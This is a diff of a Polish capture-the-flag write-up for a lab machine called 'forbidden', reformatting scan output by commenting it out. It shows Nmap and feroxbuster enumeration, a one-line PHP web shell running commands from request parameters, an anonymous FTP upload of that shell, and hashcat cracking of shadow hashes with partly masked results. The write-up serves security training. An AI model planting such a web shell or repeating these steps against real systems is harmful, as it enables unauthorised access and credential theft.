@@ -45,10 +45,10 @@ i skanowaniu **Nmapem**:
 db_nmap -A -p- 172.16.1.161
 ```
 ```bash
-host          port  proto  name  state  info
-----          ----  -----  ----  -----  ----
-172.16.1.161  21    tcp    ftp   open   vsftpd 3.0.3
-172.16.1.161  80    tcp    http  open   nginx 1.14.2
+# host          port  proto  name  state  info
+# ----          ----  -----  ----  -----  ----
+# 172.16.1.161  21    tcp    ftp   open   vsftpd 3.0.3
+# 172.16.1.161  80    tcp    http  open   nginx 1.14.2
 ```
 widzimy, że mamy otwarte porty: 
 {: .text-justify}
@@ -67,31 +67,31 @@ Najpierw przeskanujmy ten system programem **Forexbuster**:
 feroxbuster -x txt,php -u http://172.16.1.161
 ```
 ```bash
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.10.1
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://172.16.1.161
- 🚀  Threads               │ 50
- 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
- 👌  Status Codes          │ All Status Codes!
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.10.1
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 💲  Extensions            │ [txt, php]
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET        8l       41w      241c http://172.16.1.161/
-200      GET        1l        1w       10c http://172.16.1.161/robots.txt
-200      GET        1l       12w       75c http://172.16.1.161/note.txt
-[####################] - 33s    90000/90000   0s      found:3       errors:0      
-[####################] - 33s    90000/90000   2744/s  http://172.16.1.161/          
+#  ___  ___  __   __     __      __         __   ___
+# |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+# |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+# by Ben "epi" Risher 🤓                 ver: 2.10.1
+# ───────────────────────────┬──────────────────────
+#  🎯  Target Url            │ http://172.16.1.161
+#  🚀  Threads               │ 50
+#  📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+#  👌  Status Codes          │ All Status Codes!
+#  💥  Timeout (secs)        │ 7
+#  🦡  User-Agent            │ feroxbuster/2.10.1
+#  💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+#  🔎  Extract Links         │ true
+#  💲  Extensions            │ [txt, php]
+#  🏁  HTTP methods          │ [GET]
+#  🔃  Recursion Depth       │ 4
+# ───────────────────────────┴──────────────────────
+#  🏁  Press [ENTER] to use the Scan Management Menu™
+# ──────────────────────────────────────────────────
+# 404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+# 200      GET        8l       41w      241c http://172.16.1.161/
+# 200      GET        1l        1w       10c http://172.16.1.161/robots.txt
+# 200      GET        1l       12w       75c http://172.16.1.161/note.txt
+# [####################] - 33s    90000/90000   0s      found:3       errors:0      
+# [####################] - 33s    90000/90000   2744/s  http://172.16.1.161/          
 ```
 Znalezione zostały pliki: _robots.txt_ i _note.txt_. W _note.txt_ jest taka informacja ```The extra-secured .jpg file contains my password but nobody can obtain it.```. To się przyda później.
 {: .text-justify}
@@ -106,22 +106,24 @@ echo shell_exec($_REQUEST['cmd']);
 Na **FTP** zaś możemy zrobić coś takiego, po prostu wrzucić ten plik.
 {: .text-justify}
 ```bash
-root@kali2023:~/hmv/forbidden# ftp 172.16.1.161
-Connected to 172.16.1.161.
-220 (vsFTPd 3.0.3)
-Name (172.16.1.161:szikers): anonymous
-331 Please specify the password.
+ftp 172.16.1.161
+```
+```bash
+# Connected to 172.16.1.161.
+# 220 (vsFTPd 3.0.3)
+# Name (172.16.1.161:szikers): anonymous
+# 331 Please specify the password.
 Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+# 230 Login successful.
+# Remote system type is UNIX.
+# Using binary mode to transfer files.
 ftp> put shell.php5
-229 Entering Extended Passive Mode (|||23644|)
-150 Here comes the directory listing.
-drwxrwxrwx    2 0        0            4096 Jan 05 20:53 www
-226 Directory send OK.
+# 229 Entering Extended Passive Mode (|||23644|)
+# 150 Here comes the directory listing.
+# drwxrwxrwx    2 0        0            4096 Jan 05 20:53 www
+# 226 Directory send OK.
 ftp> cd www
-250 Directory successfully changed.
+# 250 Directory successfully changed.
 ftp> put shell.php5
 ```
 # 04. Reverse Shell
@@ -168,5 +170,3 @@ PS C:\temp\hashcat> .\hashcat.exe -O -a0 -m1800 .\hashe\forbidden.txt .\dict\roc
 $6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:lalu******
 $6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:bo******
 ```
-{: .text-justify}
-
